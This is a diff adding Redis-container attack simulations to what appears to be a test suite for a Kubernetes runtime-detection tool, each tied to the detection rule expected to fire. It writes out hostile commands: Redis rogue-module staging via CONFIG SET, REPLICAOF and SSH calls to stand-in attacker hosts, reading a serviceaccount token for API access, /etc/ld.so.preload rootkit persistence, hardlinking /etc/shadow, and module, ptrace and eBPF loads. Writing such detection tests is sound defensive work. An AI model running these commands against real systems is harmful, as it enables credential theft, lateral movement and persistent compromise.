@@ -801,6 +801,228 @@ attacks:
         command: rm
 
   # ═══════════════════════════════════════════════════════════════════════════
+  # COVERAGE COMPLETION — one realistic attack per previously-untested rule.
+  # Historic redis/valkey exploitation (unauth CONFIG-RCE, rogue-master module
+  # RCE, TeamTNT/Muhstik post-exploitation). Excludes crypto-mining, io_uring
+  # and raw-syscall rules by design.
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # ── R0002 Files Access Anomalies ──────────────────────────────────────────
+  # Historic: the classic unauthenticated Redis RCE (RedisWannaMine, 2018;
+  # Muhstik). CONFIG SET dir + dbfilename + SAVE makes the redis-server process
+  # itself WRITE an attacker-controlled file (webshell / cron / rogue .so) to a
+  # path it never writes in baseline → R0002 on redis-server.
+  - name: rce-rogue-module-set-dir
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dir", "/tmp"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+  - name: rce-rogue-module-set-dbfilename
+    type: custom
+    redis:
+      command: ["CONFIG", "SET", "dbfilename", "exp.so"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+  - name: rce-rogue-module-stage-payload
+    type: custom
+    redis:
+      command: ["SET", "backdoor", "rogue-module-payload-\x7fELF"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+  - name: rce-rogue-module-write
+    type: custom
+    redis:
+      command: ["BGSAVE"]
+    successIndicators:
+      - responseContains: "Background saving started"
+    expectedDetections:
+      - ruleID: R0002
+        ruleName: Files Access Anomalies
+        containerName: redis
+
+  # ── R0005 DNS Anomalies + R0011 Unexpected Egress ─────────────────────────
+  # Historic: rogue-master RCE (Pavel Toporkov, redis-rogue-server). REPLICAOF
+  # points redis at an attacker host — the SERVER resolves the domain (R0005)
+  # and dials OUT (R0011) with NO child process. This is why the paired SBoB
+  # declares egress: null — a database server should never initiate a connection.
+  - name: egress-rogue-master-replicaof
+    type: custom
+    redis:
+      command: ["REPLICAOF", "exfil.attacker.example.com", "6379"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections:
+      - ruleID: R0005
+        ruleName: DNS Anomalies
+        containerName: redis
+      - ruleID: R0011
+        ruleName: Unexpected Egress Network Traffic
+        containerName: redis
+  - name: egress-rogue-master-restore
+    type: custom
+    redis:
+      command: ["REPLICAOF", "NO", "ONE"]
+    successIndicators:
+      - responseContains: "OK"
+    expectedDetections: []
+
+  # ── R0040 Unexpected process arguments ────────────────────────────────────
+  # Historic: post-RCE recon with the trusted redis-cli binary but off-baseline
+  # args (baseline only ever runs `redis-cli ping`). `--bigkeys` enumerates the
+  # keyspace for high-value data to exfiltrate.
+  - name: recon-redis-cli-bigkeys
+    type: cmdinject
+    exec:
+      command: ["redis-cli", "--bigkeys"]
+    expectedDetections:
+      - ruleID: R0040
+        ruleName: Unexpected process arguments
+        containerName: redis
+        command: redis-cli
+
+  # ── R1004 Process executed from mount ─────────────────────────────────────
+  # Historic: rogue-master drops exp.so into the redis DATA volume, then loads
+  # it. Executing a binary staged on the mounted data dir → R1004.
+  - name: exec-from-data-mount
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "cp \"$(command -v busybox || command -v sh)\" /data/x && /data/x id 2>&1 | head -c 80; rm -f /data/x"]
+    expectedDetections:
+      - ruleID: R1004
+        ruleName: Process executed from mount
+        containerName: redis
+
+  # ── R0007 Workload uses Kubernetes API unexpectedly ───────────────────────
+  # Historic: TeamTNT-style pivot — steal the pod's serviceaccount token and
+  # query the kube-apiserver. A datastore has no reason to talk to the API.
+  - name: k8s-api-recon
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); curl -sk -H \"Authorization: Bearer $T\" https://kubernetes.default.svc/api/v1/namespaces/redis/pods 2>&1 | head -c 120"]
+    expectedDetections:
+      - ruleID: R0007
+        ruleName: Workload uses Kubernetes API unexpectedly
+        containerName: redis
+
+  # ── R1003 SSH to unexpected destination on non-standard port ──────────────
+  # Historic: lateral movement after credential access (worm-style spread).
+  - name: lateral-ssh-nonstandard-port
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -p 2222 attacker@lateral.attacker.example.com 2>&1 | head -c 100"]
+    expectedDetections:
+      - ruleID: R1003
+        ruleName: SSH to unexpected destination on non-standard port
+        containerName: redis
+
+  # ── R1011 ld_preload mechanism use ────────────────────────────────────────
+  # Historic: libprocesshider / Diamorphine userland rootkit (TeamTNT) —
+  # /etc/ld.so.preload hides the miner and persists across execs.
+  - name: persist-ld-preload
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "echo /tmp/hide.so > /etc/ld.so.preload 2>&1 | head -c 60; cat /etc/ld.so.preload 2>&1 | head -c 60; rm -f /etc/ld.so.preload"]
+    expectedDetections:
+      - ruleID: R1011
+        ruleName: ld_preload mechanism use
+        containerName: redis
+
+  # ── R1012 Hard link created over sensitive file ───────────────────────────
+  # Historic: hardlink persistence / TOCTOU over a sensitive file (defeats
+  # naive path-based deletion; the inode survives).
+  - name: persist-hardlink-shadow
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "ln /etc/shadow /tmp/shadow.hl 2>&1 | head -c 60; ls -l /tmp/shadow.hl 2>&1 | head -c 80; rm -f /tmp/shadow.hl"]
+    expectedDetections:
+      - ruleID: R1012
+        ruleName: Hard link created over sensitive file
+        containerName: redis
+
+  # ── R0004 Linux Capabilities Anomalies ────────────────────────────────────
+  # Historic: privileged-container escape. Using CAP_SYS_ADMIN to mount inside
+  # the container is a capability the baseline never exercises. (Needs the cap
+  # to succeed; the rule fires on the capability use.)
+  - name: escape-mount-cap-sys-admin
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "mkdir -p /tmp/esc; mount -t tmpfs none /tmp/esc 2>&1 | head -c 80; umount /tmp/esc 2>/dev/null || true"]
+    expectedDetections:
+      - ruleID: R0004
+        ruleName: Linux Capabilities Anomalies
+        containerName: redis
+
+  # ── R1006 Unexpected unshare syscall ──────────────────────────────────────
+  # Historic: CVE-2022-0492 cgroup-release-agent escape begins with unshare to
+  # a fresh user+mount namespace.
+  - name: escape-unshare-namespaces
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "unshare -Urmn /bin/true 2>&1 | head -c 80 || echo unshare_blocked"]
+    expectedDetections:
+      - ruleID: R1006
+        ruleName: Unexpected unshare syscall
+        containerName: redis
+
+  # ── R1002 Kernel module load ──────────────────────────────────────────────
+  # Historic: Diamorphine / Reptile LKM rootkit dropped post-RCE (TeamTNT).
+  # init_module fires the rule on attempt (needs CAP_SYS_MODULE to succeed).
+  - name: rootkit-insmod-lkm
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "printf '\\177ELF' > /tmp/rk.ko; insmod /tmp/rk.ko 2>&1 | head -c 80; rm -f /tmp/rk.ko"]
+    expectedDetections:
+      - ruleID: R1002
+        ruleName: Kernel module load
+        containerName: redis
+
+  # ── R1015 Unexpected ptrace syscall ───────────────────────────────────────
+  # Historic: process injection / credential dumping by attaching to PID 1.
+  - name: inject-ptrace-pid1
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "if command -v strace >/dev/null; then strace -p 1 -e trace=none -o /dev/null 2>&1 | head -c 60; elif command -v gdb >/dev/null; then gdb -p 1 -batch -ex quit 2>&1 | head -c 60; else echo no_ptrace_tool; fi"]
+    expectedDetections:
+      - ruleID: R1015
+        ruleName: Unexpected ptrace syscall
+        containerName: redis
+
+  # ── R0009 eBPF Program Load ───────────────────────────────────────────────
+  # Historic: BPFDoor / TeamTNT eBPF rootkit — load a program to hide/backdoor.
+  # (Needs bpftool + CAP_BPF/SYS_ADMIN; fires on the bpf(BPF_PROG_LOAD) call.)
+  - name: rootkit-ebpf-load
+    type: cmdinject
+    exec:
+      command: ["sh", "-c", "if command -v bpftool >/dev/null; then bpftool prog load /dev/null /sys/fs/bpf/x 2>&1 | head -c 80; else echo no_bpftool; fi"]
+    expectedDetections:
+      - ruleID: R0009
+        ruleName: eBPF Program Load
+        containerName: redis
+
+  # ── R2000 Exec to pod ─────────────────────────────────────────────────────
+  # Control-plane rule: fires when someone `kubectl exec`s into the pod (which
+  # is exactly how the cmdinject attacks above are delivered). A stolen
+  # kubeconfig gives an attacker interactive access to the datastore.
+  - name: control-plane-exec-to-pod
+    type: cmdinject
+    exec:
+      command: ["id"]
+    expectedDetections:
+      - ruleID: R2000
+        ruleName: Exec to pod
+        containerName: redis
+
+  # NOTE — R2001 (Port forward): also a control-plane rule, but it is triggered
+  # by `kubectl port-forward` against the pod, which this in-container attack
+  # suite has no delivery mechanism for. It needs a harness-level port-forward
+  # step, not an AttackExec/AttackRedis entry — tracked as the one remaining
+  # coverage gap. Excluded here rather than faked.
+
+  # ═══════════════════════════════════════════════════════════════════════════
   # CLEANUP — Restore Redis CONFIG mutations (PR119 rabbit)
   # CONFIG SET dir / dbfilename change persistent server state. Without
   # restoration the changes leak into later test runs of the same suite,
